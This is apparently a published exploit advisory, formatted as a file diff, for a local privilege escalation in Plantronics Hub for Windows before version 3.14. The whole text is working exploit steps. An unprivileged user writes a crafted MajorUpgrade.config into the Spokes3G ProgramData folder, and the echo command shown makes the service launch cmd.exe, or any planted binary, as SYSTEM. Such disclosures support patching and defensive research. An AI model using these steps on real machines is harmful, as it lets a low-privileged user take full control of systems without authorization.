@@ -1,0 +1,19 @@
+# Exploit Title: Plantronics Hub 3.13.2 - Local Privilege Escalation
+# Date: 2020-01-2
+# Exploit Author: Markus Krell - @MarkusKrell
+# Vendor Homepage: https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf
+# Software Link: https://www.plantronics.com/content/dam/plantronics/software/PlantronicsHubInstaller-3.13.2.exe
+# Version: Plantronics Hub for Windows prior to version 3.14
+# Tested on: Windows 10 Enterprise
+# CVE : N/A
+
+As a regular user drop a file called "MajorUpgrade.config" inside the "C:\ProgramData\Plantronics\Spokes3G" directory. The content of MajorUpgrade.config should look like the following one liner:
+<WINDOWS-USERNAME>|advertise|<FULL-PATH-TO-YOUR-DESIRED-PAYLOAD>
+
+Exchange <WINDOWS-USERNAME> with your local (non-administrative) username. Calling cmd.exe is the most basic exploitation, as it will spawn a system shell in your (unprivileged) windows session. 
+You may of course call any other binary you can plant on the machine.
+
+Steps for exploitation (PoC):
+- Open cmd.exe 
+- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
+- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
